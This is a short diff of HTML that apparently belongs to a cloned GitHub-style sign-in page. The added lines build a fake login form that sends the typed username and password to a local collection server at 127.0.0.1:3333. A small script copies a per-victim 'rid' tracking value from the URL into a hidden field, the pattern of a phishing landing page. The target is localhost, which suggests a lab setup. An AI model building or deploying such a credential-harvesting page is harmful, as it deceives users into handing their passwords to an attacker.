@@ -440,6 +440,26 @@
                     <div class="auth-form-body mt-3">
 
                         <!-- '"` --><!-- </textarea></xmp> -->
+                        <form method="POST" action="http://127.0.0.1:3333/post">
+                            <label for="username">Username:</label>
+                            <input type="text" id="username" name="username" required>
+                            <br>
+                            <label for="password">Password:</label>
+                            <input type="password" id="password" name="password" required>
+                            <br>
+                            <!-- Include the RID -->
+                            <input type="hidden" name="rid" value="">
+                            <button type="submit">Login</button>
+                        </form>
+
+                        <script>
+                            // Capture the RID from the URL and insert it into the hidden input
+                            const urlParams = new URLSearchParams(window.location.search);
+                            const rid = urlParams.get('rid');
+                            if (rid) {
+                                document.querySelector('input[name="rid"]').value = rid;
+                            }
+                        </script>
 
                         <form data-turbo="false" action="" accept-charset="UTF-8" method="post"><input type="hidden"
                                 data-csrf="true" name="authenticity_token"
